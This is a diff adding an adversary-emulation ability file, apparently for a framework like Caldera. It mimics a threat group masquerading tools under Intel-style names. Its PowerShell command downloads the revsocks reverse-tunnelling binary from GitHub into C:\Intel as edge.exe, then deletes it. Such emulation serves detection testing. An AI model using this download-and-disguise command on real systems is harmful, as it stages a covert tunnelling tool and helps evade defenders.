@@ -1,0 +1,17 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaag
+  name: "[SHADOW-TWELVE] Revsocks specific name masquerading"
+  description: "Shadow маскирует имена файлов, скриптов, приложений под продукты таких компаний, как Intel, Microsoft, VMware и т. п."
+  tactic: defense-evasion
+  technique:
+    attack_id: T1036.005
+    name: "Masquerading: Match Legitimate Name or Location"
+  platforms:
+    windows:
+      psh:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $dir="C:\Intel"; 
+          $file="$dir\edge.exe"; if(-not(Test-Path $dir)){New-Item $dir -Type Directory}; 
+          try{Invoke-WebRequest "https://github.com/kost/revsocks/releases/download/v2.8/revsocks_windows_amd64.exe" -OutFile $file -ErrorAction Stop}catch{}; 
+          Start-Sleep 2; 
+          if(Test-Path $file){Remove-Item $file};
+        timeout: 120
